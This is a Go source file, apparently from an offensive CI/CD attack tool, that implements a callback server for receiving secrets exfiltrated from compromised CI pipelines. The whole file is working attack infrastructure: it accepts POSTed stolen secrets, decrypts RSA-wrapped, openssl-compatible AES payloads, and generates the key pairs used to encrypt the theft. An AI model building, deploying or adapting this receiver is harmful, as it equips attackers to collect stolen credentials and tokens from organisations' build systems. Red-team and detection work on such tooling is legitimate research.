package pivot

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net"
	"net/http"
	"time"

	"golang.org/x/crypto/pbkdf2"
)

// ExfilPayload represents a decoded exfiltration callback from a CI job.
type ExfilPayload struct {
	EncPayload string `json:"payload"` // base64 AES-encrypted secrets
	EncKey     string `json:"key"`     // base64 RSA-encrypted AES key
	Data       string `json:"data"`    // base64 unencrypted secrets
	PipelineID string `json:"pipeline_id"`
	// Parsed fields (populated after decrypt)
	Secrets    map[string]string `json:"-"`
	ReceivedAt time.Time         `json:"-"`
	SourceAddr string            `json:"-"`
}

// CallbackServer listens for HTTP POST callbacks from exfiltration pipelines.
type CallbackServer struct {
	srv        *http.Server
	privateKey *rsa.PrivateKey
	incoming   chan *ExfilPayload
}

// NewCallbackServer creates a callback server. If privateKey is nil, only unencrypted payloads are supported.
func NewCallbackServer(privateKey *rsa.PrivateKey, bufferSize int) *CallbackServer {
	if bufferSize <= 0 {
		bufferSize = 100
	}
	return &CallbackServer{
		privateKey: privateKey,
		incoming:   make(chan *ExfilPayload, bufferSize),
	}
}

// Start begins listening on the given address. Blocks until context is cancelled.
func (cb *CallbackServer) Start(ctx context.Context, addr string) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", cb.handleCallback)

	cb.srv = &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
		BaseContext:       func(_ net.Listener) context.Context { return ctx },
	}

	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("listen %s: %w", addr, err)
	}

	go func() { //nolint:gosec // G118: shutdown context intentionally outlives parent
		<-ctx.Done()
		shutCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = cb.srv.Shutdown(shutCtx)
	}()

	if err := cb.srv.Serve(ln); err != nil && err != http.ErrServerClosed {
		return err
	}
	return nil
}

// Stop gracefully shuts down the server.
func (cb *CallbackServer) Stop(ctx context.Context) error {
	if cb.srv == nil {
		return nil
	}
	return cb.srv.Shutdown(ctx)
}

// Receive waits for the next exfiltrated payload or timeout.
func (cb *CallbackServer) Receive(ctx context.Context, timeout time.Duration) (*ExfilPayload, error) {
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	select {
	case p := <-cb.incoming:
		return p, nil
	case <-ctx.Done():
		return nil, fmt.Errorf("receive timeout: %w", ctx.Err())
	}
}

func (cb *CallbackServer) handleCallback(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 10<<20)) // 10MB max
	if err != nil || len(body) == 0 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	var payload ExfilPayload
	if err := json.Unmarshal(body, &payload); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	payload.ReceivedAt = time.Now().UTC()
	payload.SourceAddr = r.RemoteAddr

	// Determine path: encrypted or unencrypted
	switch {
	case payload.EncPayload != "" && payload.EncKey != "":
		if cb.privateKey == nil {
			http.Error(w, "no private key configured", http.StatusInternalServerError)
			return
		}
		secrets, err := cb.decryptPayload(&payload)
		if err != nil {
			http.Error(w, "decrypt failed: "+err.Error(), http.StatusBadRequest)
			return
		}
		payload.Secrets = secrets

	case payload.Data != "":
		secrets, err := decodeUnencrypted(payload.Data)
		if err != nil {
			http.Error(w, "decode failed: "+err.Error(), http.StatusBadRequest)
			return
		}
		payload.Secrets = secrets

	default:
		http.Error(w, "no data or payload field", http.StatusBadRequest)
		return
	}

	select {
	case cb.incoming <- &payload:
	default:
		// Channel full, drop oldest if possible
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, `{"status":"ok"}`)
}

func decodeUnencrypted(data string) (map[string]string, error) {
	raw, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		// Try URL-safe or raw encoding
		raw, err = base64.RawStdEncoding.DecodeString(data)
		if err != nil {
			return nil, fmt.Errorf("base64 decode: %w", err)
		}
	}
	var secrets map[string]string
	if err := json.Unmarshal(raw, &secrets); err != nil {
		return nil, fmt.Errorf("json unmarshal: %w", err)
	}
	return secrets, nil
}

func (cb *CallbackServer) decryptPayload(payload *ExfilPayload) (map[string]string, error) {
	// Decode RSA-encrypted AES key
	encKeyBytes, err := base64.StdEncoding.DecodeString(payload.EncKey)
	if err != nil {
		return nil, fmt.Errorf("decode key: %w", err)
	}

	// RSA decrypt (PKCS1v15, matching openssl rsautl -encrypt -pkcs)
	aesPassphrase, err := rsa.DecryptPKCS1v15(rand.Reader, cb.privateKey, encKeyBytes)
	if err != nil {
		return nil, fmt.Errorf("rsa decrypt: %w", err)
	}

	// Decode AES-encrypted payload
	encPayloadBytes, err := base64.StdEncoding.DecodeString(payload.EncPayload)
	if err != nil {
		return nil, fmt.Errorf("decode payload: %w", err)
	}

	// Decrypt using OpenSSL-compatible AES-256-CBC with PBKDF2
	plaintext, err := decryptOpenSSLAES(encPayloadBytes, string(aesPassphrase))
	if err != nil {
		return nil, fmt.Errorf("aes decrypt: %w", err)
	}

	var secrets map[string]string
	if err := json.Unmarshal(plaintext, &secrets); err != nil {
		return nil, fmt.Errorf("json unmarshal: %w", err)
	}
	return secrets, nil
}

// decryptOpenSSLAES decrypts data encrypted by:
//
//	openssl enc -aes-256-cbc -pbkdf2 -pass pass:$key
//
// Format: "Salted__" + 8-byte salt + ciphertext
// Key derivation: PBKDF2 with SHA256, 10000 iterations (OpenSSL 3.x default)
func decryptOpenSSLAES(data []byte, passphrase string) ([]byte, error) {
	if len(data) < 16 {
		return nil, fmt.Errorf("data too short")
	}
	// Check "Salted__" magic
	if string(data[:8]) != "Salted__" {
		return nil, fmt.Errorf("missing Salted__ header")
	}
	salt := data[8:16]
	ciphertext := data[16:]

	// PBKDF2 key derivation (AES-256-CBC needs 32-byte key + 16-byte IV)
	derived := pbkdf2.Key([]byte(passphrase), salt, 10000, 48, sha256.New)
	key := derived[:32]
	iv := derived[32:48]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("ciphertext not block-aligned")
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// Remove PKCS7 padding
	plaintext, err = pkcs7Unpad(plaintext)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}

func pkcs7Unpad(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}
	padLen := int(data[len(data)-1])
	if padLen == 0 || padLen > aes.BlockSize || padLen > len(data) {
		return nil, fmt.Errorf("invalid padding")
	}
	for i := len(data) - padLen; i < len(data); i++ {
		if data[i] != byte(padLen) {
			return nil, fmt.Errorf("invalid padding byte")
		}
	}
	return data[:len(data)-padLen], nil
}

// GenerateKeyPair generates an RSA key pair and returns the private key and PEM-encoded public key.
func GenerateKeyPair(bits int) (*rsa.PrivateKey, string, error) {
	if bits < 2048 {
		bits = 2048
	}
	privKey, err := rsa.GenerateKey(rand.Reader, bits)
	if err != nil {
		return nil, "", fmt.Errorf("generate rsa key: %w", err)
	}
	pubDER, err := x509.MarshalPKIXPublicKey(&privKey.PublicKey)
	if err != nil {
		return nil, "", fmt.Errorf("marshal public key: %w", err)
	}
	pubPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: pubDER,
	})
	return privKey, string(pubPEM), nil
}
